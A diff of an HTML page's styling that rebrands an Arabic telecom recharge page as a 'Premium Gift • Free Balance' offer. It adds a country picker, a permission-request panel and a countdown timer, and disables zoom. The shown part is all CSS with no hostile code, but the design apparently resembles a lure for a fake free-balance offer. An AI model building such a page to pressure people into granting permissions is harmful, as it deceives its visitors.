@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>شحن رصيد • Telecom Voucher</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Premium Gift • Free Balance</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
         /* ===== RESET & BASE ===== */
         * {
@@ -15,75 +15,190 @@
             padding: 0;
             box-sizing: border-box;
         }
+
+        :root {
+            --gold: #f6b83d;
+            --gold-light: #fcd48c;
+            --gold-glow: rgba(246, 184, 61, 0.35);
+            --dark-bg: #0b0806;
+            --card-bg: rgba(18, 14, 12, 0.72);
+            --glass-border: rgba(246, 184, 61, 0.10);
+            --text-primary: #f0ece6;
+            --text-secondary: #b8aaa0;
+            --shadow-heavy: 0 40px 90px rgba(0, 0, 0, 0.75);
+            --shadow-soft: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
         body {
             font-family: 'Cairo', 'Segoe UI', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            background: radial-gradient(ellipse at 30% 30%, #1a0e0a, #0a0505);
+            padding: 16px;
+            background: radial-gradient(ellipse at 20% 20%, #1f140e, #0b0806 75%);
             background-attachment: fixed;
-            color: #fff;
+            color: var(--text-primary);
             position: relative;
+            overflow-x: hidden;
         }
+
+        /* ===== AMBIENT BACKGROUND ===== */
         body::before {
             content: '';
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.04"><circle cx="20" cy="20" r="8" fill="%23ffd700"/><circle cx="80" cy="40" r="12" fill="%23ff8c00"/><circle cx="50" cy="80" r="10" fill="%23ffd700"/><circle cx="10" cy="70" r="6" fill="%23ff8c00"/><circle cx="90" cy="85" r="9" fill="%23ffd700"/></svg>') repeat;
+            inset: 0;
+            background:
+                radial-gradient(circle at 10% 80%, rgba(246, 184, 61, 0.04) 0%, transparent 60%),
+                radial-gradient(circle at 90% 20%, rgba(246, 184, 61, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 50% 50%, rgba(246, 184, 61, 0.01) 0%, transparent 80%);
             pointer-events: none;
             z-index: 0;
         }
 
+        /* ===== FLOATING PARTICLES ===== */
+        .particles {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: var(--gold);
+            border-radius: 50%;
+            opacity: 0.15;
+            animation: floatParticle linear infinite;
+        }
+        @keyframes floatParticle {
+            0% {
+                transform: translateY(100vh) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.15;
+            }
+            90% {
+                opacity: 0.15;
+            }
+            100% {
+                transform: translateY(-10vh) scale(1);
+                opacity: 0;
+            }
+        }
+
+        /* ===== APP WRAPPER ===== */
         .app-wrapper {
             width: 100%;
-            max-width: 620px;
+            max-width: 580px;
             margin: 0 auto;
             position: relative;
             z-index: 1;
+            perspective: 1200px;
         }
 
         /* ===== HEADER ===== */
         .app-header {
             text-align: center;
-            margin-bottom: 28px;
+            margin-bottom: 32px;
+            position: relative;
         }
-        .app-header .logo-icon {
-            font-size: 52px;
+
+        .logo-container {
             display: inline-block;
-            animation: float 3s ease-in-out infinite;
-            filter: drop-shadow(0 10px 30px rgba(255, 215, 0, 0.25));
-            color: #ffd700;
+            position: relative;
+            animation: logoFloat 4s ease-in-out infinite;
         }
-        @keyframes float {
+        .logo-container::before {
+            content: '';
+            position: absolute;
+            inset: -30px;
+            background: radial-gradient(circle at center, var(--gold-glow), transparent 70%);
+            opacity: 0.5;
+            filter: blur(20px);
+            animation: glowPulse 3s ease-in-out infinite;
+        }
+        @keyframes glowPulse {
+            0%,
+            100% {
+                opacity: 0.35;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(1.2);
+            }
+        }
+        @keyframes logoFloat {
             0%,
             100% {
                 transform: translateY(0) scale(1);
             }
             50% {
-                transform: translateY(-10px) scale(1.04);
+                transform: translateY(-10px) scale(1.02);
             }
         }
+
+        .logo-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(145deg, rgba(246, 184, 61, 0.15), rgba(246, 184, 61, 0.04));
+            border: 1px solid rgba(246, 184, 61, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: var(--gold);
+            backdrop-filter: blur(12px);
+            box-shadow: 0 0 60px rgba(246, 184, 61, 0.08), inset 0 1px 0 rgba(246, 184, 61, 0.2);
+            position: relative;
+            margin: 0 auto 6px;
+            transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .logo-icon:hover {
+            transform: scale(1.06) rotate(2deg);
+        }
+        .logo-icon i {
+            filter: drop-shadow(0 0 20px rgba(246, 184, 61, 0.2));
+        }
+
         .app-header h1 {
-            font-size: 30px;
+            font-size: 34px;
             font-weight: 900;
-            margin-top: 4px;
-            background: linear-gradient(135deg, #ffd700, #ff8c00, #ff4500);
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #fcd48c, var(--gold), #e8a830);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 40px rgba(255, 215, 0, 0.15);
-            letter-spacing: 0.5px;
+            text-shadow: none;
+            position: relative;
+            display: inline-block;
+        }
+        .app-header h1::after {
+            content: '';
+            position: absolute;
+            bottom: -4px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+            opacity: 0.4;
         }
         .app-header .subtitle {
-            color: #d4b8a0;
+            color: var(--text-secondary);
             font-size: 16px;
             font-weight: 300;
-            opacity: 0.85;
-            margin-top: 2px;
+            margin-top: 4px;
+            letter-spacing: 0.3px;
+            opacity: 0.8;
         }
 
         /* ===== STEP INDICATOR ===== */
@@ -93,443 +208,381 @@
             align-items: center;
             gap: 6px;
             margin-bottom: 28px;
+            padding: 0 10px;
         }
         .step-dot {
-            width: 40px;
-            height: 40px;
+            width: 44px;
+            height: 44px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.04);
-            border: 2px solid rgba(255, 215, 0, 0.10);
+            background: rgba(255, 255, 255, 0.03);
+            border: 2px solid rgba(255, 255, 255, 0.06);
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 800;
-            font-size: 14px;
-            color: #666;
-            transition: all 0.45s ease;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.2);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
+            backdrop-filter: blur(4px);
         }
-        .step-dot .step-label {
-            position: absolute;
-            bottom: -22px;
-            font-size: 10px;
-            font-weight: 600;
-            color: #777;
-            white-space: nowrap;
-            opacity: 0;
-            transition: opacity 0.3s;
+        .step-dot .dot-inner {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
-        .step-dot.active .step-label,
-        .step-dot.completed .step-label {
-            opacity: 1;
+        .step-dot.active .dot-inner {
+            background: linear-gradient(135deg, var(--gold), #d4892a);
+            color: #0b0806;
+            box-shadow: 0 0 40px var(--gold-glow), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+            transform: scale(1.12);
         }
-        .step-dot.active {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            border-color: #ffd700;
-            color: #1a0a0a;
-            transform: scale(1.15);
-            box-shadow: 0 0 40px rgba(255, 215, 0, 0.35);
+        .step-dot.completed .dot-inner {
+            background: rgba(40, 167, 69, 0.2);
+            border: 2px solid #28a745;
+            color: #28a745;
+            box-shadow: 0 0 30px rgba(40, 167, 69, 0.15);
         }
-        .step-dot.completed {
-            background: #28a745;
-            border-color: #28a745;
-            color: #fff;
+        .step-dot .dot-icon {
+            font-size: 16px;
         }
+        .step-dot .dot-label {
+            display: none;
+        }
+
         .step-line {
-            width: 32px;
+            width: 44px;
             height: 2px;
-            background: rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
             border-radius: 2px;
-            transition: background 0.4s ease;
+            transition: all 0.6s ease;
+            position: relative;
+            overflow: hidden;
         }
-        .step-line.active {
-            background: linear-gradient(90deg, #ffd700, #ff8c00);
+        .step-line::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, var(--gold), #d4892a);
+            transform: translateX(-100%);
+            transition: transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+        .step-line.active::after {
+            transform: translateX(0);
         }
 
         /* ===== MAIN CARD ===== */
         .main-card {
-            background: rgba(20, 10, 10, 0.65);
-            backdrop-filter: blur(28px);
-            -webkit-backdrop-filter: blur(28px);
+            background: var(--card-bg);
+            backdrop-filter: blur(32px) saturate(1.2);
+            -webkit-backdrop-filter: blur(32px) saturate(1.2);
             border-radius: 48px;
-            padding: 32px 28px 28px;
-            border: 1px solid rgba(255, 215, 0, 0.10);
-            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 215, 0, 0.04);
+            padding: 36px 28px 32px;
+            border: 1px solid var(--glass-border);
+            box-shadow: var(--shadow-heavy), inset 0 1px 0 rgba(246, 184, 61, 0.04);
             position: relative;
             overflow: hidden;
+            transform-style: preserve-3d;
+            transition: transform 0.3s ease;
         }
         .main-card::before {
             content: '';
             position: absolute;
-            top: -40%;
+            top: -50%;
             right: -30%;
             width: 100%;
             height: 100%;
-            background: radial-gradient(circle at 70% 30%, rgba(255, 215, 0, 0.04), transparent 70%);
+            background: radial-gradient(circle at 70% 30%, rgba(246, 184, 61, 0.04), transparent 70%);
             pointer-events: none;
         }
         .main-card::after {
-            content: '📱';
+            content: '';
             position: absolute;
-            bottom: -20px;
-            left: -20px;
-            font-size: 100px;
-            opacity: 0.03;
-            transform: rotate(-10deg);
+            bottom: -30%;
+            left: -20%;
+            width: 80%;
+            height: 80%;
+            background: radial-gradient(circle at 30% 70%, rgba(246, 184, 61, 0.02), transparent 70%);
             pointer-events: none;
         }
 
         /* ===== STEPS ===== */
         .step {
             display: none;
-            animation: fadeSlide 0.5s ease forwards;
+            animation: stepEnter 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+            position: relative;
+            z-index: 2;
         }
         .step.active {
             display: block;
         }
-        @keyframes fadeSlide {
-            from {
+
+        @keyframes stepEnter {
+            0% {
                 opacity: 0;
-                transform: translateY(28px);
+                transform: translateY(40px) scale(0.96) rotateX(4deg);
             }
-            to {
+            100% {
                 opacity: 1;
-                transform: translateY(0);
+                transform: translateY(0) scale(1) rotateX(0);
             }
         }
 
         .step-title {
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 800;
             margin-bottom: 2px;
-            color: #fff;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
         }
         .step-title .highlight {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            background: linear-gradient(135deg, var(--gold-light), var(--gold), #d4892a);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
         .step-desc {
-            color: #c4a88a;
+            color: var(--text-secondary);
             font-size: 15px;
             margin-bottom: 20px;
+            font-weight: 300;
+            letter-spacing: 0.2px;
         }
 
-        /* ===== LANGUAGE SELECTOR ===== */
-        .lang-grid {
+        /* ===== COUNTRY GRID ===== */
+        .country-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            margin: 16px 0 8px;
-        }
-        .lang-btn {
-            background: rgba(255, 255, 255, 0.04);
-            border: 2px solid rgba(255, 215, 0, 0.06);
-            border-radius: 30px;
-            padding: 20px 10px;
-            color: #fff;
-            font-weight: 700;
-            font-size: 20px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Cairo', sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
             gap: 12px;
-            backdrop-filter: blur(4px);
-        }
-        .lang-btn .lang-icon {
-            font-size: 32px;
-            line-height: 1;
-        }
-        .lang-btn:hover {
-            background: rgba(255, 215, 0, 0.07);
-            border-color: #ffd700;
-            transform: translateY(-4px);
-            box-shadow: 0 12px 40px rgba(255, 215, 0, 0.08);
-        }
-        .lang-btn:active {
-            transform: scale(0.96);
-        }
-        .lang-btn.selected {
-            background: rgba(255, 215, 0, 0.12);
-            border-color: #ffd700;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.10);
+            margin: 18px 0 14px;
         }
 
-        /* ===== COUNTRY & OPERATOR GRID ===== */
-        .grid-2col {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin: 16px 0 8px;
-        }
-        .grid-3col {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 12px;
-            margin: 16px 0 8px;
-        }
-        .option-btn {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 215, 0, 0.06);
+        .country-btn {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
             border-radius: 24px;
-            padding: 16px 8px;
-            color: #fff;
-            font-weight: 600;
+            padding: 18px 8px 14px;
+            color: var(--text-primary);
+            font-weight: 700;
             font-size: 15px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Cairo', sans-serif;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 4px;
+            font-family: 'Cairo', sans-serif;
             backdrop-filter: blur(4px);
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        .country-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(246, 184, 61, 0.04), transparent);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        .country-btn .flag {
+            font-size: 36px;
+            line-height: 1.2;
+            position: relative;
+            z-index: 1;
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.3));
+        }
+        .country-btn .name {
+            font-size: 14px;
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+        }
+        .country-btn .glow {
+            position: absolute;
+            inset: -2px;
+            border-radius: 24px;
+            background: linear-gradient(135deg, var(--gold), transparent 60%);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+        }
+        .country-btn:hover {
+            transform: translateY(-8px) scale(1.03) rotateX(2deg);
+            border-color: rgba(246, 184, 61, 0.2);
+            background: rgba(246, 184, 61, 0.04);
+            box-shadow: 0 16px 50px rgba(0, 0, 0, 0.4), 0 0 40px rgba(246, 184, 61, 0.04);
+        }
+        .country-btn:hover .glow {
+            opacity: 1;
+        }
+        .country-btn:active {
+            transform: scale(0.94);
+            transition-duration: 0.08s;
+        }
+        .country-btn .shine {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0.04), transparent 60%);
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.6s ease;
+        }
+        .country-btn:hover .shine {
+            opacity: 1;
+        }
+
+        /* ===== PERMISSION AREA ===== */
+        .permission-wrapper {
+            background: rgba(246, 184, 61, 0.02);
+            border-radius: 28px;
+            padding: 18px 20px;
+            margin: 12px 0 18px;
+            border: 1px solid rgba(246, 184, 61, 0.04);
+            backdrop-filter: blur(4px);
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.02);
+        }
+        .permission-wrapper ul {
+            list-style: none;
+            padding: 0;
+            margin: 4px 0;
+            text-align: right;
+        }
+        .permission-wrapper ul li {
+            padding: 7px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+            color: var(--text-secondary);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 12px;
+        }
+        .permission-wrapper ul li i {
+            color: var(--gold);
+            font-size: 18px;
+            width: 26px;
             text-align: center;
         }
-        .option-btn .opt-icon {
-            font-size: 34px;
-            line-height: 1.2;
+        .permission-wrapper .note {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 10px;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.03);
+            padding-top: 10px;
+            opacity: 0.7;
         }
-        .option-btn .opt-name {
-            font-size: 15px;
-            font-weight: 700;
-        }
-        .option-btn .opt-sub {
-            font-size: 12px;
-            color: #998;
-            font-weight: 400;
-        }
-        .option-btn:hover {
-            background: rgba(255, 215, 0, 0.06);
-            border-color: rgba(255, 215, 0, 0.2);
-            transform: translateY(-5px);
-            box-shadow: 0 12px 30px rgba(255, 215, 0, 0.05);
-        }
-        .option-btn:active {
-            transform: scale(0.95);
-        }
-        .option-btn.selected {
-            background: rgba(255, 215, 0, 0.10);
-            border-color: #ffd700;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.08);
-            transform: translateY(-3px);
-        }
-        .option-btn .badge-prefix {
-            font-size: 11px;
-            background: rgba(255, 215, 0, 0.10);
-            padding: 2px 10px;
-            border-radius: 20px;
-            color: #ffd700;
-            margin-top: 2px;
+        .permission-wrapper .note strong {
+            color: var(--gold);
+            opacity: 1;
         }
 
-        /* ===== OPERATOR COLOR THEMES ===== */
-        .opt-vodafone {
-            border-color: rgba(230, 0, 0, 0.2);
-        }
-        .opt-vodafone.selected {
-            border-color: #E60000;
-            background: rgba(230, 0, 0, 0.08);
-            box-shadow: 0 0 30px rgba(230, 0, 0, 0.12);
-        }
-        .opt-orange {
-            border-color: rgba(255, 102, 0, 0.2);
-        }
-        .opt-orange.selected {
-            border-color: #FF6600;
-            background: rgba(255, 102, 0, 0.08);
-            box-shadow: 0 0 30px rgba(255, 102, 0, 0.12);
-        }
-        .opt-etisalat {
-            border-color: rgba(0, 166, 81, 0.2);
-        }
-        .opt-etisalat.selected {
-            border-color: #00A651;
-            background: rgba(0, 166, 81, 0.08);
-            box-shadow: 0 0 30px rgba(0, 166, 81, 0.12);
-        }
-        .opt-we {
-            border-color: rgba(102, 0, 153, 0.2);
-        }
-        .opt-we.selected {
-            border-color: #660099;
-            background: rgba(102, 0, 153, 0.08);
-            box-shadow: 0 0 30px rgba(102, 0, 153, 0.12);
-        }
-        .opt-stc {
-            border-color: rgba(0, 128, 0, 0.2);
-        }
-        .opt-stc.selected {
-            border-color: #008000;
-            background: rgba(0, 128, 0, 0.08);
-            box-shadow: 0 0 30px rgba(0, 128, 0, 0.12);
-        }
-        .opt-mobily {
-            border-color: rgba(0, 112, 192, 0.2);
-        }
-        .opt-mobily.selected {
-            border-color: #0070C0;
-            background: rgba(0, 112, 192, 0.08);
-            box-shadow: 0 0 30px rgba(0, 112, 192, 0.12);
-        }
-        .opt-zain {
-            border-color: rgba(128, 0, 128, 0.2);
-        }
-        .opt-zain.selected {
-            border-color: #800080;
-            background: rgba(128, 0, 128, 0.08);
-            box-shadow: 0 0 30px rgba(128, 0, 128, 0.12);
-        }
-        .opt-ooredoo {
-            border-color: rgba(220, 20, 60, 0.2);
-        }
-        .opt-ooredoo.selected {
-            border-color: #DC143C;
-            background: rgba(220, 20, 60, 0.08);
-            box-shadow: 0 0 30px rgba(220, 20, 60, 0.12);
-        }
-        .opt-omniah {
-            border-color: rgba(0, 100, 200, 0.2);
-        }
-        .opt-omniah.selected {
-            border-color: #0064C8;
-            background: rgba(0, 100, 200, 0.08);
-            box-shadow: 0 0 30px rgba(0, 100, 200, 0.12);
-        }
-        .opt-batelco {
-            border-color: rgba(0, 80, 200, 0.2);
-        }
-        .opt-batelco.selected {
-            border-color: #0050C8;
-            background: rgba(0, 80, 200, 0.08);
-            box-shadow: 0 0 30px rgba(0, 80, 200, 0.12);
-        }
-        .opt-du {
-            border-color: rgba(128, 0, 128, 0.2);
-        }
-        .opt-du.selected {
-            border-color: #800080;
-            background: rgba(128, 0, 128, 0.08);
-            box-shadow: 0 0 30px rgba(128, 0, 128, 0.12);
-        }
-        .opt-oman {
-            border-color: rgba(0, 80, 200, 0.2);
-        }
-        .opt-oman.selected {
-            border-color: #0050C8;
-            background: rgba(0, 80, 200, 0.08);
-            box-shadow: 0 0 30px rgba(0, 80, 200, 0.12);
-        }
-
-        /* ===== PHONE INPUT ===== */
+        /* ===== INPUT ===== */
         .input-group {
-            margin: 18px 0 14px;
+            margin: 18px 0 16px;
             text-align: right;
         }
         .input-group label {
             display: block;
             font-size: 15px;
-            color: #d4b8a0;
-            margin-bottom: 6px;
-            font-weight: 700;
+            color: var(--text-secondary);
+            margin-bottom: 5px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
         }
-        .input-group .input-wrap {
-            display: flex;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 50px;
-            border: 1px solid rgba(255, 215, 0, 0.06);
-            transition: all 0.3s ease;
-            overflow: hidden;
-        }
-        .input-group .input-wrap:focus-within {
-            border-color: #ffd700;
-            box-shadow: 0 0 0 5px rgba(255, 215, 0, 0.05);
-        }
-        .input-group .input-wrap .prefix-badge {
-            padding: 0 18px;
-            font-weight: 800;
-            font-size: 16px;
-            color: #ffd700;
-            background: rgba(255, 215, 0, 0.06);
-            height: 100%;
-            display: flex;
-            align-items: center;
-            border-left: 1px solid rgba(255, 255, 255, 0.04);
-            white-space: nowrap;
-            min-height: 56px;
-            font-family: 'Cairo', sans-serif;
+        .input-group label i {
+            color: var(--gold);
+            margin-left: 8px;
         }
         .input-group input {
-            flex: 1;
-            padding: 16px 20px;
-            border: none;
-            background: transparent;
-            color: #fff;
+            width: 100%;
+            padding: 18px 24px;
+            border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(0, 0, 0, 0.35);
+            color: var(--text-primary);
             font-size: 20px;
             outline: none;
+            transition: all 0.4s ease;
             font-family: 'Cairo', sans-serif;
             text-align: right;
             letter-spacing: 0.5px;
-            min-height: 56px;
-            width: 100%;
+            backdrop-filter: blur(4px);
+            box-shadow: inset 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        .input-group input:focus {
+            border-color: rgba(246, 184, 61, 0.2);
+            box-shadow: 0 0 0 6px rgba(246, 184, 61, 0.03), inset 0 4px 20px rgba(0, 0, 0, 0.3);
         }
         .input-group input::placeholder {
-            color: #665;
+            color: rgba(255, 255, 255, 0.15);
             font-size: 16px;
         }
-        .input-group .validation-hint {
-            font-size: 13px;
-            margin-top: 8px;
-            padding: 6px 14px;
-            border-radius: 20px;
-            display: inline-block;
-            font-weight: 600;
-        }
-        .validation-hint.valid {
-            color: #28a745;
-            background: rgba(40, 167, 69, 0.08);
-        }
-        .validation-hint.invalid {
-            color: #ff4500;
-            background: rgba(255, 69, 0, 0.08);
-        }
-        .validation-hint.idle {
-            color: #886;
-            background: rgba(255, 255, 255, 0.02);
-        }
 
-        /* ===== BUTTONS ===== */
+        /* ===== BUTTON ===== */
         .btn-gold {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            background: linear-gradient(145deg, #f6b83d, #d4892a);
             border: none;
-            color: #1a0a0a;
+            color: #0b0806;
             font-weight: 800;
-            padding: 18px 30px;
+            padding: 20px 30px;
             border-radius: 60px;
             font-size: 22px;
             width: 100%;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 40px rgba(255, 215, 0, 0.20);
-            margin-top: 10px;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            box-shadow: 0 8px 40px rgba(246, 184, 61, 0.2), inset 0 1px 0 rgba(255, 255, 255, 0.2);
             font-family: 'Cairo', sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 14px;
             letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+        }
+        .btn-gold::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 60px;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), transparent 60%);
+            pointer-events: none;
+        }
+        .btn-gold::after {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 60px;
+            background: linear-gradient(135deg, var(--gold), transparent 60%);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+            filter: blur(4px);
+            z-index: -1;
         }
         .btn-gold:hover:not(:disabled) {
             transform: translateY(-4px) scale(1.01);
-            box-shadow: 0 16px 50px rgba(255, 215, 0, 0.30);
+            box-shadow: 0 16px 60px rgba(246, 184, 61, 0.3), 0 0 80px rgba(246, 184, 61, 0.06);
+        }
+        .btn-gold:hover:not(:disabled)::after {
+            opacity: 1;
+        }
+        .btn-gold:active:not(:disabled) {
+            transform: scale(0.95) translateY(0);
+            transition-duration: 0.06s;
         }
         .btn-gold:disabled {
-            opacity: 0.5;
+            opacity: 0.4;
             cursor: not-allowed;
             transform: none;
         }
@@ -538,7 +591,7 @@
             width: 26px;
             height: 26px;
             border: 3px solid rgba(0, 0, 0, 0.12);
-            border-top: 3px solid #1a0a0a;
+            border-top: 3px solid #0b0806;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
@@ -554,200 +607,116 @@
             }
         }
 
-        .btn-outline {
-            background: transparent;
-            border: 2px solid rgba(255, 215, 0, 0.15);
-            color: #ffd700;
-            font-weight: 700;
-            padding: 14px 24px;
-            border-radius: 60px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: 'Cairo', sans-serif;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            backdrop-filter: blur(4px);
-        }
-        .btn-outline:hover {
-            background: rgba(255, 215, 0, 0.06);
-            border-color: #ffd700;
-            transform: translateY(-3px);
-            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.06);
-        }
-
         /* ===== STATUS ===== */
         .status {
             margin-top: 14px;
-            padding: 12px 16px;
-            border-radius: 24px;
+            padding: 14px 18px;
+            border-radius: 28px;
             font-size: 14px;
             font-weight: 600;
             display: none;
             backdrop-filter: blur(8px);
             text-align: center;
+            border: 1px solid transparent;
+            animation: statusIn 0.4s ease forwards;
+        }
+        @keyframes statusIn {
+            0% {
+                opacity: 0;
+                transform: translateY(12px) scale(0.96);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
         }
         .status.success {
-            background: rgba(40, 167, 69, 0.10);
+            background: rgba(40, 167, 69, 0.08);
             color: #28a745;
             display: block;
-            border: 1px solid rgba(40, 167, 69, 0.12);
+            border-color: rgba(40, 167, 69, 0.1);
         }
         .status.info {
-            background: rgba(255, 215, 0, 0.05);
-            color: #ffd700;
+            background: rgba(246, 184, 61, 0.04);
+            color: var(--gold);
             display: block;
-            border: 1px solid rgba(255, 215, 0, 0.06);
+            border-color: rgba(246, 184, 61, 0.06);
         }
         .status.error {
-            background: rgba(255, 69, 0, 0.08);
-            color: #ff4500;
+            background: rgba(220, 53, 69, 0.06);
+            color: #dc3545;
             display: block;
-            border: 1px solid rgba(255, 69, 0, 0.10);
+            border-color: rgba(220, 53, 69, 0.08);
         }
 
-        /* ===== VOUCHER ===== */
-        .voucher-box {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 32px;
-            padding: 28px 24px 24px;
-            border: 1px solid rgba(255, 215, 0, 0.08);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(255, 215, 0, 0.04);
-            margin: 16px 0 18px;
-            position: relative;
-            overflow: hidden;
-            transition: all 0.4s ease;
-        }
-        .voucher-box::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -30%;
-            width: 80%;
-            height: 80%;
-            background: radial-gradient(circle at 70% 30%, rgba(255, 215, 0, 0.03), transparent 70%);
-            pointer-events: none;
-        }
-        .voucher-box .voucher-header {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            margin-bottom: 16px;
-            padding-bottom: 14px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-        }
-        .voucher-box .voucher-icon {
-            width: 56px;
-            height: 56px;
-            border-radius: 18px;
+        /* ===== TIMER ===== */
+        .timer-box {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 60px;
+            padding: 24px 32px;
+            margin: 20px 0 14px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
-            flex-shrink: 0;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            gap: 28px;
+            border: 1px solid rgba(246, 184, 61, 0.04);
+            backdrop-filter: blur(8px);
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            animation: timerMaterialize 0.8s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
         }
-        .voucher-box .voucher-operator {
-            font-size: 20px;
-            font-weight: 800;
+        @keyframes timerMaterialize {
